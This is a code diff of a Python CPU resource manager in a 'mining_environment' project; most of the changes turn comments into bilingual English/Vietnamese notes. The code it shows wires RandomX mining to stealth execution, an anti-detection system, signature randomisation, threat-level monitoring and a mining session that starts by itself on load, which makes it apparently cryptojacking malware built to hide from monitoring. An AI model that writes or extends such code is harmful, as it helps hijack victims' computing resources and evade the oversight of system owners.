@@ -1,6 +1,6 @@
-# MIGRATION NOTE: Replaced ThrottlingManager với MiningIntegrationAdapter
-# See OptimizedCalculationChain for new high-performance CPU management
-# Legacy throttling: 28% CPU → New optimized: 800% CPU utilization
+# **MIGRATION NOTE** (ghi chú di chuyển): **ThrottlingManager replacement** (thay thế ThrottlingManager – bằng MiningIntegrationAdapter)
+# **OptimizedCalculationChain reference** (tham khảo chuỗi tính toán tối ưu – for high-performance CPU management)
+# **Performance improvement** (cải tiến hiệu suất): **Legacy throttling** (giới hạn cũ): 28% CPU → **New optimized** (tối ưu mới): 800% CPU utilization
 # resource_control.py
 
 # mypy: ignore-errors
@@ -20,8 +20,8 @@ import threading
 import subprocess
 import re
 import glob
-# (CPU-only) NVML/GPU bị vô hiệu hóa hoàn toàn
-class _DummyNVML:  # minimal stub để tránh ImportError
+# **CPU-only build** (bản chỉ CPU – NVML/GPU bị vô hiệu hóa hoàn toàn)
+class _DummyNVML:  # **Minimal stub** (lớp giả để tránh ImportError – thay thế NVML khi không có GPU)
     class NVMLError(Exception):
         pass
     def __getattr__(self, _name):
@@ -34,25 +34,25 @@ import resource
 from pathlib import Path
 from .cloak_strategies import StrategyType
 
-# ✅ UNIFIED LOGGING: Use centralized logging system
+# ✅ **UNIFIED LOGGING** (ghi log thống nhất – sử dụng hệ thống logging tập trung)
 from .unified_logging import get_unified_logger
 
-# ✅ ERROR MANAGEMENT: Use centralized error handling system
+# ✅ **ERROR MANAGEMENT** (quản lý lỗi – sử dụng hệ thống xử lý lỗi tập trung)
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ STANDARDIZED: Get unified logger instance
+# ✅ **STANDARDIZED LOGGING** (chuẩn hóa ghi log – lấy unified logger instance)
 resource_logger = get_unified_logger('resource_control')
 
-# ✅ ERROR REPORTER: Get centralized error reporter instance
+# ✅ **ERROR REPORTER** (bộ báo lỗi – lấy centralized error reporter instance)
 error_reporter = get_error_reporter()
-from mining_environment.cpu_plugins import discover_cpu_plugins, ICpuTechnique  # Sprint 1 plugin framework
+from mining_environment.cpu_plugins import discover_cpu_plugins, ICpuTechnique  # **Sprint 1 plugin framework** (khung plugin thủ công Sprint 1 – hỗ trợ CPU techniques)
 from threading import RLock
 from mining_environment.cpu_plugins.core.config import load_plugin_cfg, CpuPluginFile
 
-# === IMPORT TÁI CẤU TRÚC ===
+# === **REFACTORED IMPORTS** (import tái cấu trúc – các module đã được cải tiến) ===
 from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningIntegrationAdapter
 
-# Thêm imports cho stealth frameworks
+# **Stealth framework imports** (import khung stealth – thêm các module che giấu nâng cao)
 try:
     from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager  # type: ignore
     from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem  # type: ignore
@@ -122,17 +122,17 @@ class _SingletonMeta(type):
 
 class CPUResourceManager(metaclass=_SingletonMeta):
     """
-    CPU Resource Management với advanced cloaking và RandomX optimization
+    **CPU Resource Management** (quản lý tài nguyên CPU – với advanced cloaking và RandomX optimization)
     """
 
     def __init__(self, config: Dict[str, Any], logger: logging.Logger):
         """
-        Khởi tạo CPUResourceManager với advanced stealth capabilities
+        **CPUResourceManager initialization** (khởi tạo quản lý tài nguyên CPU – với advanced stealth capabilities)
         """
         self.logger = logger
         self.config = config
         
-        # Enhanced: Initialize stealth components
+        # **[Enhanced initialization]** (khởi tạo nâng cao – các thành phần stealth)
         try:
             from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager
             from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem
@@ -144,7 +144,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             self.signature_randomizer = SignatureRandomizer(logger)
             self.xeon_optimizer = XeonE5OptimizedConfig(logger)
             
-            # Get optimal mining configuration
+            # **[Get optimal mining configuration]** (lấy cấu hình khai thác tối ưu – cho CPU hiện tại)
             self.optimal_mining_config = self.xeon_optimizer.generate_mining_config('balanced')
             self.current_threat_level = "LOW"
             
@@ -164,21 +164,21 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             )
             self.logger.error(f"Lỗi khi khởi tạo cpu manager: {e}")
             self.stealth_enabled = False
-            # Fallback initialization for basic functionality
+            # **[Fallback initialization]** (khởi tạo dự phòng – chức năng cơ bản khi lỗi)
             pass
 
         # ✅ FIXED: Initialize _registered_pids attribute để tránh AttributeError
         self._registered_pids = set()
         
-        # Basic resource control attributes
+        # **[Basic resource control attributes]** (thuộc tính điều khiển tài nguyên cơ bản – CPU count, cores)
         self.cpu_count = psutil.cpu_count(logical=True) or 1
         self.physical_cores = psutil.cpu_count(logical=False) or 1
         
-        # Background monitoring thread
+        # **[Background monitoring thread]** (luồng giám sát nền – theo dõi mối đe dọa)
         if self.stealth_enabled:
             threading.Thread(target=self._stealth_monitoring_loop, daemon=True).start()
 
-        # === TÁI CẤU TRÚC: MiningIntegrationAdapter thay thế ThrottlingManager cũ ===
+        # **[REFACTORED]** (tái cấu trúc – MiningIntegrationAdapter thay thế ThrottlingManager cũ)
         self.throttler = None
         try:
             self.throttler = MiningIntegrationAdapter(logger=self.logger)
@@ -190,7 +190,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
                 if self.throttler.initialize_optimized_mining(cores):
                     self.logger.info(f"🚀 [CPU Manager] Auto-initialized optimized mining for {cores} cores")
                     
-                    # Auto-start mining session for immediate availability
+                    # **[Auto-start mining session]** (tự động khởi động phiên khai thác – khả dụng ngay lập tức)
                     if self.throttler.start_mining_session():
                         self.logger.info("✅ [CPU Manager] Mining session auto-started successfully")
                     else:
